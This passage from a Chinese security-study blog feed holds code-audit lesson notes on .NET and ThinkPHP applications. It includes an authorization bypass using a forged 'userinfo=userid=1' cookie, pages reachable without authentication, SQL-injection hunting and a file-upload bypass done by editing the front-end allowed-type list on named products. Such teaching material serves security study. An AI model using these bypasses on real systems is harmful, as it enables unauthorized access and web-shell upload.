src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410151822282.png" alt="image-20230410151822282"></p><h6 id="根据aspx里面的内容关键字找到对应名字dll文件进行反编译"><a href="#根据aspx里面的内容关键字找到对应名字dll文件进行反编译" class="headerlink" title="根据aspx里面的内容关键字找到对应名字dll文件进行反编译"></a>根据aspx里面的内容关键字找到对应名字dll文件进行反编译</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152002056.png" alt="image-20230410152002056"></p><h6 id="陆续找到反编译后的对应的文件内容purchase-purchase下的pd文件"><a href="#陆续找到反编译后的对应的文件内容purchase-purchase下的pd文件" class="headerlink" title="陆续找到反编译后的对应的文件内容purchase.purchase下的pd文件"></a>陆续找到反编译后的对应的文件内容purchase.purchase下的pd文件</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152114963.png" alt="image-20230410152114963"></p><h6 id="发现并没有什么验证内容"><a href="#发现并没有什么验证内容" class="headerlink" title="发现并没有什么验证内容"></a>发现并没有什么验证内容</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152354261.png" alt="image-20230410152354261"></p><h6 id="根据这个MasterPageFile母版文件-类似文件包含的意思，找到相应地方purchase看一下"><a href="#根据这个MasterPageFile母版文件-类似文件包含的意思，找到相应地方purchase看一下" class="headerlink" title="根据这个MasterPageFile母版文件,类似文件包含的意思，找到相应地方purchase看一下"></a>根据这个MasterPageFile母版文件,类似文件包含的意思，找到相应地方purchase看一下</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152426491.png" alt="image-20230410152426491"></p><h6 id="发现这个文件地方对应的dll如下"><a href="#发现这个文件地方对应的dll如下" class="headerlink" title="发现这个文件地方对应的dll如下"></a>发现这个文件地方对应的dll如下</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152601040.png" alt="image-20230410152601040"></p><h6 id="找到了这个验证的地方"><a href="#找到了这个验证的地方" class="headerlink" title="找到了这个验证的地方"></a>找到了这个验证的地方</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152649803.png" alt="image-20230410152649803"></p><h6 id="这里的代码说明如果userid-lt-x3D-0就会定向到登录界面"><a href="#这里的代码说明如果userid-lt-x3D-0就会定向到登录界面" class="headerlink" title="这里的代码说明如果userid&lt;&#x3D;0就会定向到登录界面"></a>这里的代码说明如果userid&lt;&#x3D;0就会定向到登录界面</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410152846549.png" alt="image-20230410152846549"></p><h6 id="跟踪一下这个GetUserId方法发现userinfo不为空时才会接收userid值"><a href="#跟踪一下这个GetUserId方法发现userinfo不为空时才会接收userid值" class="headerlink" title="跟踪一下这个GetUserId方法发现userinfo不为空时才会接收userid值"></a>跟踪一下这个GetUserId方法发现userinfo不为空时才会接收userid值</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410153026208.png" alt="image-20230410153026208"></p><h6 id="添加一个userinfo-x3D-userid-x3D-1-让GetUserId-gt-0-实现越权成功"><a href="#添加一个userinfo-x3D-userid-x3D-1-让GetUserId-gt-0-实现越权成功" class="headerlink" title="添加一个userinfo&#x3D;userid&#x3D;1,让GetUserId&gt;0,实现越权成功"></a>添加一个userinfo&#x3D;userid&#x3D;1,让GetUserId&gt;0,实现越权成功</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410153257701.png" alt="image-20230410153257701"></p><h5 id="第二种：验证未引用-特定资源文件没有验证过程"><a href="#第二种：验证未引用-特定资源文件没有验证过程" class="headerlink" title="第二种：验证未引用-特定资源文件没有验证过程"></a>第二种：验证未引用-特定资源文件没有验证过程</h5><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410203456912.png" alt="image-20230410203456912"></p><h6 id="第一种挖掘分析到purchase-Master为验证-直接全局搜索当前目录未引用的稳即有未授权"><a href="#第一种挖掘分析到purchase-Master为验证-直接全局搜索当前目录未引用的稳即有未授权" class="headerlink" title="第一种挖掘分析到purchase.Master为验证,直接全局搜索当前目录未引用的稳即有未授权"></a>第一种挖掘分析到purchase.Master为验证,直接全局搜索当前目录未引用的稳即有未授权</h6><h6 id="开发角度：后台文件安全访问问题"><a href="#开发角度：后台文件安全访问问题" class="headerlink" title="开发角度：后台文件安全访问问题"></a>开发角度：后台文件安全访问问题</h6><h6 id="1-每个文件都进行代码的复制验证加入"><a href="#1-每个文件都进行代码的复制验证加入" class="headerlink" title="1.每个文件都进行代码的复制验证加入"></a>1.每个文件都进行代码的复制验证加入</h6><h6 id="2-写入配置文件-验证代码），后台文件包含加载配置文件"><a href="#2-写入配置文件-验证代码），后台文件包含加载配置文件" class="headerlink" title="2.写入配置文件(验证代码），后台文件包含加载配置文件"></a>2.写入配置文件(验证代码），后台文件包含加载配置文件</h6><h6 id="找到一处没有引用这个的文件"><a href="#找到一处没有引用这个的文件" class="headerlink" title="找到一处没有引用这个的文件"></a>找到一处没有引用这个的文件</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410204350376.png" alt="image-20230410204350376"></p><h6 id="这里直接访问到了"><a href="#这里直接访问到了" class="headerlink" title="这里直接访问到了"></a>这里直接访问到了</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410204902959.png" alt="image-20230410204902959"></p><h6 id="这个文件也没有引用"><a href="#这个文件也没有引用" class="headerlink" title="这个文件也没有引用"></a>这个文件也没有引用</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410205044053.png" alt="image-20230410205044053"></p><h6 id="也是直接进入"><a href="#也是直接进入" class="headerlink" title="也是直接进入"></a>也是直接进入</h6><p><img src="/../images/Day88-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230410205107387.png" alt="image-20230410205107387"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day87 代码审计-NET项目&amp;DLL反编译&amp;MSSQL监控&amp;VS搜索&amp;注入&amp;上传</title>
      <link href="/2023/03/26/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/03/26/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、NET普通源码&amp;编译源码</p><p>2、DLL反编译&amp;后缀文件&amp;指向</p><p>3、代码审计-SQL注入&amp;文件上传</p><p>ASPX文件-&gt;CS ASPX.CS DLL反编译后寻找  看核心代码分析漏洞</p><p>CS ASPX.CS DLL反编译文件-&gt;ASPX文件寻找  确定漏洞进行调试测试</p><p>代码审计时要把这个反编译文件提取导入到IDE中  后期搜索关键字或函数挖掘</p><h3 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h3><h4 id="后缀解析："><a href="#后缀解析：" class="headerlink" title="后缀解析："></a>后缀解析：</h4><p>asp.net可以用C# ，VB.NET ，Jscript.net等等来开发，但是通常首选都是C#和VB.NET</p><p>审计asp.net的时候，首先得弄明白他的结构，他并不像php那么单纯。</p><p>一般来说，在asp.net应用中，需要进行观察的文件有：**.aspx，.cs，.ashx，dll**文件</p><blockquote><p>1、.aspx是页面后的代码，aspx负责显示，服务器端的动作就是在.cs定义的</p><p>2、.cs是类文件，公共类神马的就是这个了</p><p>3、.ashx是一般处理程序，主要用于写web handler,可以理解成不会显示的aspx页面</p><p>4、.dll就是cs文件编译之后的程序集</p></blockquote><h4 id="Inherits、CodeFile、CodeBehind"><a href="#Inherits、CodeFile、CodeBehind" class="headerlink" title="Inherits、CodeFile、CodeBehind"></a>Inherits、CodeFile、CodeBehind</h4><h4 id="指向解析："><a href="#指向解析：" class="headerlink" title="指向解析："></a>指向解析：</h4><h4 id="Inherits"><a href="#Inherits" class="headerlink" title="Inherits"></a>Inherits</h4><p>msdn解释：定义供页继承的代码隐藏类。 它可以是从 Page 类派生的任何类。 此特性与 CodeFile 特性一起使用，后者包含指向代码隐藏类的源文件的路径。 Inherits 特性在使用 C# 作为页面语言时区分大小写，而在使用 Visual Basic 作为页面语言时不区分大小写。</p><h4 id="CodeFile"><a href="#CodeFile" class="headerlink" title="CodeFile"></a>CodeFile</h4><p>msdn解释：指定指向页引用的代码隐藏文件的路径。 此特性与 Inherits 特性一起使用，用于将代码隐藏源文件与网页相关联。 此特性仅对编译的页有效。</p><h4 id="Codebehind"><a href="#Codebehind" class="headerlink" title="Codebehind"></a>Codebehind</h4><p>msdn解释：指定包含与页关联的类的已编译文件的名称。 该特性不能在运行时使用。此特性用于 Web 应用程序项目。</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-反编译工具-ILSpy-amp-dnSpy-amp-ReFlector"><a href="#➢-反编译工具-ILSpy-amp-dnSpy-amp-ReFlector" class="headerlink" title="➢ 反编译工具-ILSpy&amp;dnSpy&amp;ReFlector"></a>➢ 反编译工具-ILSpy&amp;dnSpy&amp;ReFlector</h4><h4 id="➢-SQL注入-MSSQL监控-反编译-amp-函数搜索"><a href="#➢-SQL注入-MSSQL监控-反编译-amp-函数搜索" class="headerlink" title="➢ SQL注入-MSSQL监控-反编译&amp;函数搜索"></a>➢ SQL注入-MSSQL监控-反编译&amp;函数搜索</h4><h4 id="➢-文件上传-操作函数搜索-反编译-amp-功能抓包"><a href="#➢-文件上传-操作函数搜索-反编译-amp-功能抓包" class="headerlink" title="➢ 文件上传-操作函数搜索-反编译&amp;功能抓包"></a>➢ 文件上传-操作函数搜索-反编译&amp;功能抓包</h4></blockquote><h4 id="反编译工具-ILSpy-amp-dnSpy-amp-ReFlector"><a href="#反编译工具-ILSpy-amp-dnSpy-amp-ReFlector" class="headerlink" title="#反编译工具-ILSpy&amp;dnSpy&amp;ReFlector"></a>#反编译工具-ILSpy&amp;dnSpy&amp;ReFlector</h4><p>ILSpyi &gt; dnSpy &#x3D; Reflector</p><p><a href="https://github.com/dnSpy/dnSpy/releases">https://github.com/dnSpy/dnSpy/releases</a></p><p><a href="https://www.xitongzhijia.net/soft/44725.html">https://www.xitongzhijia.net/soft/44725.html</a></p><p><a href="https://github.com/icsharpcode/ILSpy/releases">https://github.com/icsharpcode/ILSpy/releases</a></p><h4 id="SQL注入-MSSQL监控-反编译-amp-函数搜索"><a href="#SQL注入-MSSQL监控-反编译-amp-函数搜索" class="headerlink" title="#SQL注入-MSSQL监控-反编译&amp;函数搜索"></a>#SQL注入-MSSQL监控-反编译&amp;函数搜索</h4><p>启明星请假加班系统 V8.5</p><p>数库监控-&gt;搜索未过滤写法(“ +)-&gt;AddLeaveData.cs-&gt;txt_username-&gt;注入语句测试</p><h4 id="文件上传-操作函数搜索-反编译-amp-功能抓包"><a href="#文件上传-操作函数搜索-反编译-amp-功能抓包" class="headerlink" title="#文件上传-操作函数搜索-反编译&amp;功能抓包"></a>#文件上传-操作函数搜索-反编译&amp;功能抓包</h4><p>企业商学院学习平台 V2020</p><p>搜上传关键字(SaveAs)-&gt;指向文件及代码-&gt;List_Edit.aspx-&gt;-&gt;FileAllow-&gt;后缀增加上传</p><p><strong>编辑器的文件上传基本没有安全问题</strong></p><p><strong>分析代码流程：</strong></p><p>如果不知道bin下的哪个dll文件是核心代码存在的地方，对照这些文件显示文件ashx里面的这些Class可以寻找bin下的名字相同的dll就是了</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409165402913.png" alt="image-20230409165402913"></p><p>像这样就可以找到了</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409165753253.png" alt="image-20230409165753253"></p><p>反编译dll文件后，这里在里面搜索.net文件上传的关键字SaveAs</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409170154824.png" alt="image-20230409170154824"></p><p>这里时匹配，考虑可能是过滤</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409170729379.png" alt="image-20230409170729379"></p><p>发现引用了这个dll文件</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409171143943.png" alt="image-20230409171143943"></p><p>继续反编译一下这个WeiSha.Common.dll文件</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409171214466.png" alt="image-20230409171214466"></p><p>因为刚才用MapPath的地方是WeiSha.Common.Server,所以找到WeiSha.Common.dll下的Server问文件，发现果不其然是过滤函数MapPath()<img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409171507243.png" alt="image-20230409171507243"></p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409171404764.png" alt="image-20230409171404764"></p><p>找到一处没有过滤的地方</p><p>这里是接收表单值的接收限制fileallow的类型，即前端验证</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409173658871.png" alt="image-20230409173658871"></p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409173730581.png" alt="image-20230409173730581"></p><p>对应此处的代码</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409173505777.png" alt="image-20230409173505777"></p><p>根据这里的视图接收参数也可以判断是前端验证</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409173950671.png" alt="image-20230409173950671"></p><p>在上传处右击审查元素，添加一个php类型</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409174216427.png" alt="image-20230409174216427"></p><p>然后上传一个aspx文件，上传成功</p><p><img src="/../images/Day87-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-NET%E9%A1%B9%E7%9B%AE-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-MSSQL%E7%9B%91%E6%8E%A7-VS%E6%90%9C%E7%B4%A2-%E6%B3%A8%E5%85%A5-%E4%B8%8A%E4%BC%A0/image-20230409174245019.png" alt="image-20230409174245019"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day86 代码审计-PHP项目&amp;TP框架&amp;安全写法&amp;1day利用&amp;0day分析</title>
      <link href="/2023/03/26/Day86-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-%E5%AE%89%E5%85%A8%E5%86%99%E6%B3%95-1day%E5%88%A9%E7%94%A8-0day%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/26/Day86-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-%E5%AE%89%E5%85%A8%E5%86%99%E6%B3%95-1day%E5%88%A9%E7%94%A8-0day%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、审计漏洞-TP框架&amp;SQL注入&amp;代码执行</p><p>1、审计思路-SQL监控&amp;调试开关&amp;安全写法</p><p>3、审计类型-常规架构&amp;MVC架构&amp;三方框架</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、语言审计-PHP&amp;.Net&amp;Java&amp;Python</p><p>2、漏洞审计-注入&amp;上传&amp;RCE&amp;未授权等</p><p>3、框架审计-ThinkPHP&amp;Spring&amp;Flask等</p><p>4、工具审计-RIPS&amp;VCG&amp;Fortify&amp;Bandit等</p><p>5、技术审计-动静态调试&amp;DAST&amp;SAST&amp;IAST等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 开发基础-TP框架-入口&amp;版本&amp;调试&amp;路由&amp;写法等</p><p>​                ➢ 利用安全写法-TP5框架-SQL注入&amp;XSS-HSYCMS</p><p>​                ➢ 利用框架漏洞-TP3框架-SQL注入&amp;Demo&amp;YxtCMF</p><p>​                ➢ 挖掘框架漏洞-TP5框架-代码执行&amp;调用链&amp;对比修改</p></blockquote><h4 id="开发基础-TP框架-入口-amp-版本-amp-调试-amp-路由-amp-写法等"><a href="#开发基础-TP框架-入口-amp-版本-amp-调试-amp-路由-amp-写法等" class="headerlink" title="#开发基础-TP框架-入口&amp;版本&amp;调试&amp;路由&amp;写法等"></a>#开发基础-TP框架-入口&amp;版本&amp;调试&amp;路由&amp;写法等</h4><h4 id="利用安全写法-TP5框架-SQL注入-amp-XSS-HSYCMS"><a href="#利用安全写法-TP5框架-SQL注入-amp-XSS-HSYCMS" class="headerlink" title="#利用安全写法-TP5框架-SQL注入&amp;XSS-HSYCMS"></a>#利用安全写法-TP5框架-SQL注入&amp;XSS-HSYCMS</h4><h4 id="利用框架漏洞-TP3框架-SQL注入-amp-Demo-amp-YxtCMF"><a href="#利用框架漏洞-TP3框架-SQL注入-amp-Demo-amp-YxtCMF" class="headerlink" title="#利用框架漏洞-TP3框架-SQL注入&amp;Demo&amp;YxtCMF"></a>#利用框架漏洞-TP3框架-SQL注入&amp;Demo&amp;YxtCMF</h4><h5 id="TinkPHP-3-2-3-历史漏洞"><a href="#TinkPHP-3-2-3-历史漏洞" class="headerlink" title="TinkPHP 3.2.3 历史漏洞"></a>TinkPHP 3.2.3 历史漏洞</h5><p><a href="https://blog.csdn.net/hackzkaq/article/details/118382007">https://blog.csdn.net/hackzkaq/article/details/118382007</a></p><p><a href="https://blog.csdn.net/weixin_54902210/article/details/124889749">https://blog.csdn.net/weixin_54902210/article/details/124889749</a></p><p>-Demo段：</p><h6 id="1、搭建Tp3框架源码"><a href="#1、搭建Tp3框架源码" class="headerlink" title="1、搭建Tp3框架源码"></a>1、搭建Tp3框架源码</h6><h6 id="2、创建数据库并配置"><a href="#2、创建数据库并配置" class="headerlink" title="2、创建数据库并配置"></a>2、创建数据库并配置</h6><p>数据库导入并执行：injection.sql</p><p>写入配置：&#x2F;Application&#x2F;Common&#x2F;Conf&#x2F;config.php</p><blockquote><?phpreturn array(​//'配置项'=>'配置值'​    'SHOW_PAGE_TRACE' => true,​    /* 数据库设置 */​    'DB_TYPE'               =>  'mysql',     // 数据库类型​    'DB_HOST'               =>  '127.0.0.1', // 服务器地址​    'DB_NAME'               =>  'injection',          // 数据库名​    'DB_USER'               =>  'root',      // 用户名​    'DB_PWD'                =>  'root',          // 密码​    'DB_PORT'               =>  '3306',        // 端口​    'DB_PREFIX'             =>  '',    // 数据库表前缀​    'DB_PARAMS'            =>  array(), // 数据库连接参数​    'DB_DEBUG'        =>  TRUE, // 数据库调试模式 开启后可以记录SQL日志​    'DB_FIELDS_CACHE'       =>  true,        // 启用字段缓存​    'DB_CHARSET'            =>  'utf8',      // 数据库编码默认采用utf8​    'DB_DEPLOY_TYPE'        =>  0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)​    'DB_RW_SEPARATE'        =>  false,       // 数据库读写是否分离 主从式有效​    'DB_MASTER_NUM'         =>  1, // 读写分离后 主服务器数量​    'DB_SLAVE_NO'           =>  '', // 指定从服务器序号);</blockquote><p>3、写入数据库操作代码</p><p>写入代码：&#x2F;Application&#x2F;Home&#x2F;Controller&#x2F;IndexController.class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">​    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">​        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>(<span 